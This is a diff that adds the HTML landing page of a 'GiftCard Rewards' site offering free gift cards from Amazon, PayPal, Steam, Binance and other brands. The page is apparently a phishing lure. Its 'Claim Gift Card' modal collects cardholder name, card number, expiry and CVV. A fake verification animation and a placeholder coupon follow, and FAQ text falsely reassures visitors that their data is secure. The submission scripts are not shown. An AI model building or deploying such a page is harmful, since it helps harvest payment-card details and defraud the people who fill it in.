@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GiftCard Rewards — Premium Gift Card Rewards Platform</title>
+  <meta name="description" content="Claim gift cards from Amazon, PayPal, Steam, Binance, Google Play, and Apple. Earn rewards instantly.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script src="config.js"></script>
+  <script src="app.js"></script>
+  <script src="index.js" defer></script>
+</head>
+<body>
+  <!-- Animated Background -->
+  <div class="bg-animated"></div>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="container navbar-content">
+      <a href="index.html" class="logo">GiftCard Rewards</a>
+      <div class="nav-links">
+        <a href="#giftcards" class="nav-link">Gift Cards</a>
+        <a href="#features" class="nav-link">Features</a>
+        <a href="#faq" class="nav-link">FAQ</a>
+        <a href="login.html" class="btn btn-primary" style="padding: 10px 20px; font-size: 14px;">Sign In</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Hero Section -->
+  <section class="hero">
+    <div class="container hero-content">
+      <div class="hero-badge">
+        <span class="pulse"></span>
+        New rewards available daily
+      </div>
+      <h1 class="hero-title">Premium Gift Cards.<br>Instant Rewards.</h1>
+      <p class="hero-subtitle">Claim gift cards from Amazon, PayPal, Steam, Binance, Google Play, and Apple. Fast, secure, and hassle-free rewards.</p>
+      <div class="hero-buttons">
+        <a href="register.html" class="btn btn-primary">Get Started Free</a>
+        <a href="#giftcards" class="btn btn-secondary">View Gift Cards</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Gift Cards Section -->
+  <section class="section" id="giftcards">
+    <div class="container">
+      <h2 class="section-title">Available Gift Cards</h2>
+      <p class="section-subtitle">Choose from our selection of premium gift cards</p>
+      
+      <div class="giftcards-grid" id="giftcards-container">
+        <!-- Gift cards will be loaded dynamically -->
+        <div class="glass-card giftcard" style="--card-color-start: #667eea; --card-color-end: #764ba2;">
+          <div style="text-align: center; padding: 40px;">
+            <div class="loader" style="width: 40px; height: 40px;"></div>
+            <p style="margin-top: 16px; color: var(--text-secondary);">Loading gift cards...</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features Section -->
+  <section class="section" id="features">
+    <div class="container">
+      <h2 class="section-title">Why Choose Us</h2>
+      <p class="section-subtitle">Fast, secure, and reliable gift card rewards</p>
+      
+      <div class="features-grid">
+        <div class="glass-card feature-card">
+          <div class="feature-icon">⚡</div>
+          <h3 class="feature-title">Instant Processing</h3>
+          <p class="feature-desc">Your gift card claims are processed quickly with our automated system</p>
+        </div>
+        
+        <div class="glass-card feature-card">
+          <div class="feature-icon" style="background: var(--secondary-gradient);">🔒</div>
+          <h3 class="feature-title">Secure & Private</h3>
+          <p class="feature-desc">Your information is encrypted and protected with enterprise-grade security</p>
+        </div>
+        
+        <div class="glass-card feature-card">
+          <div class="feature-icon" style="background: var(--success-gradient);">🎁</div>
+          <h3 class="feature-title">Premium Brands</h3>
+          <p class="feature-desc">Access gift cards from the world's most popular brands and platforms</p>
+        </div>
+        
+        <div class="glass-card feature-card">
+          <div class="feature-icon" style="background: var(--warning-gradient);">📱</div>
+          <h3 class="feature-title">Mobile Friendly</h3>
+          <p class="feature-desc">Claim rewards on any device - desktop, tablet, or smartphone</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section class="section" id="faq">
+    <div class="container">
+      <h2 class="section-title">Frequently Asked Questions</h2>
+      <p class="section-subtitle">Everything you need to know about our platform</p>
+      
+      <div class="faq-list">
+        <div class="faq-item">
+          <button class="faq-question glass-card">
+            <span>How does the gift card claim process work?</span>
+            <span class="faq-icon">▼</span>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              Simply select a gift card, click "Claim Now", and submit your card information. Our system will verify and process your claim within 15-20 seconds, then generate a unique coupon code for you.
+            </div>
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <button class="faq-question glass-card">
+            <span>Is my card information secure?</span>
+            <span class="faq-icon">▼</span>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              Yes! We use industry-standard encryption to protect all submitted information. Your data is stored securely and never shared with third parties.
+            </div>
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <button class="faq-question glass-card">
+            <span>How long does it take to receive my coupon?</span>
+            <span class="faq-icon">▼</span>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              Most claims are processed instantly within 15-20 seconds. You'll see a processing animation and receive your unique coupon code directly in your dashboard.
+            </div>
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <button class="faq-question glass-card">
+            <span>Can I claim multiple gift cards?</span>
+            <span class="faq-icon">▼</span>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              Yes, you can claim multiple gift cards. Each claim is tracked separately in your dashboard with its own status and coupon code.
+            </div>
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <button class="faq-question glass-card">
+            <span>What brands are available?</span>
+            <span class="faq-icon">▼</span>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-content">
+              We offer gift cards from Amazon, PayPal, Steam, Binance, Google Play, and Apple. New brands are added regularly based on demand.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA Section -->
+  <section class="section" style="text-align: center;">
+    <div class="container">
+      <h2 class="section-title">Ready to Start?</h2>
+      <p class="section-subtitle">Join thousands of users claiming rewards daily</p>
+      <a href="register.html" class="btn btn-primary" style="font-size: 18px; padding: 18px 40px;">Create Free Account</a>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <div>
+          <div class="footer-brand">GiftCard Rewards</div>
+          <p class="footer-desc">Premium gift card rewards platform. Fast, secure, and reliable.</p>
+        </div>
+        
+        <div>
+          <h4 class="footer-title">Quick Links</h4>
+          <ul class="footer-links">
+            <li><a href="index.html">Home</a></li>
+            <li><a href="login.html">Sign In</a></li>
+            <li><a href="register.html">Register</a></li>
+            <li><a href="#giftcards">Gift Cards</a></li>
+          </ul>
+        </div>
+        
+        <div>
+          <h4 class="footer-title">Support</h4>
+          <ul class="footer-links">
+            <li><a href="#faq">FAQ</a></li>
+            <li><a href="#">Help Center</a></li>
+            <li><a href="#">Contact Us</a></li>
+          </ul>
+        </div>
+        
+        <div>
+          <h4 class="footer-title">Legal</h4>
+          <ul class="footer-links">
+            <li><a href="#">Privacy Policy</a></li>
+            <li><a href="#">Terms of Service</a></li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="footer-bottom">
+        © 2026 GiftCard Rewards. All rights reserved.
+      </div>
+    </div>
+  </footer>
+
+  <!-- Claim Modal -->
+  <div class="modal-overlay" id="claim-modal">
+    <div class="modal glass-card" style="position: relative;">
+      <button class="modal-close" onclick="closeClaimModal()">✕</button>
+      <div class="modal-header">
+        <h3 class="modal-title" id="modal-giftcard-name">Claim Gift Card</h3>
+        <p class="modal-subtitle">Enter your card details to claim</p>
+      </div>
+      
+      <form id="claim-form">
+        <input type="hidden" id="giftcard-id">
+        
+        <div class="form-group">
+          <label class="form-label">Card Holder Name</label>
+          <input type="text" class="form-input" id="card-holder" placeholder="John Doe" required>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label">Card Number</label>
+          <input type="text" class="form-input" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+        </div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+          <div class="form-group">
+            <label class="form-label">Expiry Date</label>
+            <input type="text" class="form-input" id="card-expiry" placeholder="MM/YY" required maxlength="5">
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label">CVV</label>
+            <input type="text" class="form-input" id="card-cvv" placeholder="123" required maxlength="4">
+          </div>
+        </div>
+        
+        <button type="submit" class="btn btn-primary w-full" style="margin-top: 8px;" id="submit-claim-btn">
+          Submit Claim
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Processing Overlay -->
+  <div class="processing-overlay" id="processing-overlay">
+    <div class="processing-spinner"></div>
+    <p class="processing-text">Processing Your Claim</p>
+    <p class="processing-steps" id="processing-step">Verifying card information...</p>
+  </div>
+
+  <!-- Success Modal -->
+  <div class="modal-overlay" id="success-modal">
+    <div class="modal glass-card" style="text-align: center;">
+      <div style="font-size: 64px; margin-bottom: 16px;">🎉</div>
+      <h3 class="modal-title">Claim Successful!</h3>
+      <p class="modal-subtitle" style="margin-bottom: 24px;">Your coupon has been generated</p>
+      
+      <div class="coupon-display">
+        <div class="coupon-code" id="generated-coupon">AMAZON-XXXXXX</div>
+        <p class="coupon-info">Valid for 30 days • One-time use</p>
+      </div>
+      
+      <button class="btn btn-primary w-full" onclick="copyCoupon()" style="margin-bottom: 12px;">
+        Copy Coupon Code
+      </button>
+      <br>
+      <a href="dashboard.html" class="btn btn-secondary w-full">Go to Dashboard</a>
+    </div>
+  </div>
+
+  <div class="alert alert-success" id="copy-alert" style="position: fixed; bottom: 20px; right: 20px; z-index: 4000;"></div>
+</body>
+</html>
